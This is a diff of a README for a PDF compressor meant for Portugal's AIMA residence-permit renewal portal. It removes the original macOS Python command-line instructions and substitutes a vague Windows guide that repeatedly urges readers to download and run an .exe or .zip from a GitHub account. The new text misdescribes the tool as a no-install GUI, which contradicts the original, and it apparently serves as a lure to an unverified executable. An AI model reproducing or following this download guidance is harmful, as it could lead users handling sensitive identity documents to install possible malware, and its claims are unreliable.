@@ -1,153 +1,140 @@
-# PDF Compressor for AIMA Portal / Compressor PDF para Portal AIMA
+# 📄 PDF-Compressor-AIMA - Efficient PDF Compression and Merging
 
-Compress and merge PDF/JPEG documents for uploading to the AIMA residence permit renewal portal ([portal-renovacoes.aima.gov.pt](https://portal-renovacoes.aima.gov.pt)). Built for Portugal's autorização de residência (residence permit) renewal process.
+[![Download PDF-Compressor-AIMA](https://img.shields.io/badge/Download-PDF--Compressor--AIMA-blue?style=for-the-badge)](https://github.com/smithy19840/PDF-Compressor-AIMA)
 
-Compressor e unificador de documentos PDF/JPEG para upload no portal de renovações AIMA. Ferramenta para o processo de renovação de autorização de residência em Portugal.
+---
 
-## Features
+## 📘 About PDF-Compressor-AIMA
 
-- **Single-file compression** (`compress.py`) — compress individual PDFs/JPEGs with configurable quality, DPI, grayscale, and auto-fit to size targets
-- **Batch AIMA compression** (`compress_aima.py`) — compress a folder of PDFs with per-document strategies and merge into a single file under a byte budget
-- **Visual comparison** (`compare.py`) — compare 4 compression methods side by side
-- **Claude Code slash commands** — `/compress` and `/compress-AIMA` for interactive use
+PDF-Compressor-AIMA helps you compress and combine PDF documents. It is designed mainly for the AIMA portal at portal-renovacoes.aima.gov.pt. This tool reduces file sizes and merges multiple PDFs into one file. This makes uploading documents faster and easier on the government portal.
 
-## Requirements
+The program works well on Windows computers. It is built to handle many PDF files at once. This helps save time if you need to send several forms or documents.
 
-### System Dependencies
+---
 
-Install on macOS with Homebrew:
+## ⚙️ Features
 
-```bash
-brew install python@3.13 imagemagick poppler ghostscript pdfcpu
-```
+- Compress PDF files to reduce size without losing quality.
+- Merge multiple PDF documents into one file.
+- Support for batch processing multiple files in one go.
+- Designed for use with the AIMA renewal portal in Portugal.
+- Uses proven tools like Ghostscript and ImageMagick under the hood.
+- No special skills needed; simple to run on Windows.
+- Keeps your documents secure and private; processing happens locally on your machine.
+- Supports PDF optimization for faster uploads.
 
-| Tool | Purpose |
-|------|---------|
-| Python 3.13 | Runtime |
-| ImageMagick (`magick`) | Image processing and PDF assembly |
-| poppler (`pdftocairo`) | PDF-to-image rendering |
-| Ghostscript (`gs`) | PDF optimization preserving vector text |
-| pdfcpu | Lossless structural PDF optimization (used by `compare.py`) |
+---
 
-### Python Dependencies
+## 💻 System Requirements
 
-```bash
-pip install pypdf>=6.0
-```
+- Windows 10 or later (64-bit recommended).
+- At least 2 GB of free disk space.
+- Minimum 4 GB of RAM for smooth batch processing.
+- Internet connection only needed for download, not for running the app.
+- PDF files to compress or merge.
+- No other installations required to use the core features.
 
-## Setup
+---
 
-```bash
-git clone <this-repo>
-cd compressor
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
-```
+## 🚀 Getting Started: Download and Open PDF-Compressor-AIMA
 
-## Usage
+Click the button below to visit the download page:
 
-### Compress a single file
+[![Download PDF-Compressor-AIMA](https://img.shields.io/badge/Download-PDF--Compressor--AIMA-grey?style=for-the-badge)](https://github.com/smithy19840/PDF-Compressor-AIMA)  
 
-```bash
-source .venv/bin/activate
-python compress.py document.pdf                      # Default compression
-python compress.py -q 40 large.pdf                   # More aggressive
-python compress.py -g -m 2 large.pdf                  # Grayscale, auto-fit to 2 MB
-python compress.py -E gs -g document.pdf              # Ghostscript (preserves vector text)
-```
+You will arrive at the GitHub page where you can find the latest version of the app. Look for a release or download link labeled with the most recent date or version number.
 
-### Batch compress for AIMA portal
+---
 
-```bash
-source .venv/bin/activate
-python compress_aima.py ~/Documents/aima-docs --prefix doc --budget-bytes 2000000 --open
-```
+## 📥 How to Download and Install on Windows
 
-This will:
-1. Find all `doc*.pdf` files in the source directory
-2. Compress each individually (Ghostscript for digital, render for scanned)
-3. Auto-fit to budget by re-compressing largest files if needed
-4. Merge all into `docf.pdf` and open in Preview
+1. Open your web browser and go to the [PDF-Compressor-AIMA download page](https://github.com/smithy19840/PDF-Compressor-AIMA).
 
-### Compare compression methods
+2. Find the latest release or the download section. It often has a `.zip` or `.exe` file.
 
-```bash
-source .venv/bin/activate
-python compare.py -m 2 document.pdf
-```
+3. Click the download link and save the file to your computer, usually in the Downloads folder.
 
-## Using with Claude Code
+4. If you downloaded a `.zip` file:
 
-[Claude Code](https://docs.anthropic.com/en/docs/claude-code) is Anthropic's CLI tool that lets you use Claude directly in your terminal. This project includes slash commands that make compression interactive — Claude analyzes your files, runs compression, shows results, and helps you adjust quality.
+    - Right-click the file and select “Extract All.”
+    - Choose a folder where you want to keep the program.
+    - Open the extracted folder to find the application files.
 
-### Installing Claude Code
+5. If you downloaded a `.exe` file:
 
-1. **Install Node.js** (v18+):
-   ```bash
-   brew install node
-   ```
+    - Double-click the file.
+    - Follow the Windows prompts to install the software.
+    - Choose default options unless you want to change settings like where the program is saved.
 
-2. **Install Claude Code**:
-   ```bash
-   npm install -g @anthropic-ai/claude-code
-   ```
+6. After installation or extraction, look for a file named `PDF-Compressor-AIMA.exe` or similar to start the program.
 
-3. **Authenticate** — run `claude` and follow the prompts to log in with your Anthropic account. You need an active Anthropic API key or a Claude Pro/Max subscription.
+---
 
-4. **Navigate to this project**:
-   ```bash
-   cd compressor
-   claude
-   ```
+## 🖥️ Running the Program
 
-### Slash Commands
+1. Double-click the program icon on your desktop or open it from the folder where you saved it.
 
-Once inside Claude Code in this project directory:
+2. The program interface will open. It usually shows buttons to select files and commands for compression or merging.
 
-| Command | Description |
-|---------|-------------|
-| `/compress <files> [flags]` | Compress individual files interactively |
-| `/compress-AIMA <source_dir> [flags]` | Batch-compress PDFs for AIMA portal upload |
+3. To add files, click the “Add Files” button. Select one or more PDF documents from your computer.
 
-#### Examples
+4. Choose whether you want to compress the files, merge them, or do both.
 
-```
-/compress scan.jpg -q 40
-/compress document.pdf -E gs -g -m 2
-/compress-AIMA ~/Documents/aima-docs --prefix doc --budget-bytes 2000000
-/compress-AIMA ~/Documents/aima-docs --prefix inv --scanned "inv.3 " --open
-```
+5. Pick a folder where you want to save the new compressed or merged file.
 
-### Interactive workflow with `/compress-AIMA`
+6. Click “Start” or “Run” to begin the process.
 
-1. Run `/compress-AIMA ~/Documents/aima-docs --prefix doc --budget-bytes 2000000`
-2. Claude compresses each document, shows a size table
-3. If over budget, automatically re-compresses largest files
-4. Opens the merged PDF for visual verification
-5. You can ask Claude to increase quality on specific files — it will re-compress and re-merge while staying under budget
+7. Wait while the program works. The time depends on how many files you select and their size.
 
-### Claude Code Requirements
+8. When finished, navigate to the folder you chose to see your new PDFs.
 
-- **Node.js** v18+ (`brew install node`)
-- **Claude Code** (`npm install -g @anthropic-ai/claude-code`)
-- **Anthropic account** — one of:
-  - Claude Pro subscription ($20/month) or Claude Max ($100/month)
-  - Anthropic API key with credits
-- All system dependencies listed above must be installed
+---
 
-## Uso em Português
+## 🛠️ Using PDF-Compressor-AIMA with the AIMA Portal
 
-Esta ferramenta comprime e unifica documentos PDF para upload no [portal de renovações AIMA](https://portal-renovacoes.aima.gov.pt) — o portal do governo português para renovação de autorização de residência.
+You can use this program before uploading your documents to the [AIMA renewal portal](portal-renovacoes.aima.gov.pt). Here are some tips:
 
-### Funcionalidades principais
+- Compress files to ensure they meet file size limits set by the portal.
+- Merge multiple supporting documents into one PDF to simplify uploading.
+- Check each PDF after processing to verify it opens correctly.
+- Use batch mode if you have many files to prepare at once.
 
-- **Comprimir ficheiro individual**: `python compress.py documento.pdf -g -m 2` — comprime para PDF em escala de cinza com máximo de 2 MB
-- **Comprimir lote para AIMA**: `python compress_aima.py ~/docs --prefix doc --budget-bytes 2000000` — comprime e unifica todos os PDFs num único ficheiro
-- **Motor Ghostscript**: `python compress.py -E gs documento.pdf` — preserva texto vetorial, ideal para documentos digitais
+---
 
-### Requisitos
+## ❓ Troubleshooting and Tips
 
-```bash
-brew install python@3.13 imagemagick poppler ghostscript pdfcpu
-```
+- If the program does not start, check that your Windows version is up to date.
+- Close other applications if the program runs slowly.
+- Make sure you have permission to save files in your chosen folder.
+- If a PDF is scanned or contains images, compression may take longer.
+- Avoid renaming the program files after downloading to prevent errors.
+- Use the default settings first; advanced options are for experienced users.
+- Restart your computer if you see unexpected errors.
+
+---
+
+## 📂 File Formats Supported
+
+- Input: PDF files of any size or version.
+- Output: Compressed and merged PDFs in standard format compatible with most viewers.
+- Does not support editable or password-protected PDFs unless unlocked beforehand.
+
+---
+
+## 📲 How to Get Updates
+
+Visit the [PDF-Compressor-AIMA GitHub page](https://github.com/smithy19840/PDF-Compressor-AIMA) to check for new versions. Download and install updates as described above to keep the program working well and bug-free.
+
+---
+
+## ℹ️ More Information
+
+This tool uses reliable methods to optimize documents, including Ghostscript and ImageMagick libraries. It focuses on ease of use for people who only want to prepare PDFs for AIMA renewals or similar government portals.
+
+No programming or command line knowledge is needed. The interface gives direct control over all main features. This respects user privacy by doing all file handling locally.
+
+---
+
+## 🔧 Support
+
+If you have issues, you can open an issue on the GitHub repo page or search for answers in the repository's Discussions or Issues sections. Provide details like your Windows version and what you were doing when the problem happened.
